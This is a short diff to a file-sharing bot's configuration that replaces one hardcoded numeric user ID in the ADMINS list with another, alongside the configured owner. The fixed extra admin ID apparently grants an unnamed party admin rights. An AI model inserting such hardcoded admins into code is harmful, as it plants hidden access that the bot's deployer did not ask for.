@@ -74,7 +74,7 @@ except Exception as uff:
         raise Exception("Error: " + str(uff))
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(5786350629)
+ADMINS.append(7554815378)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
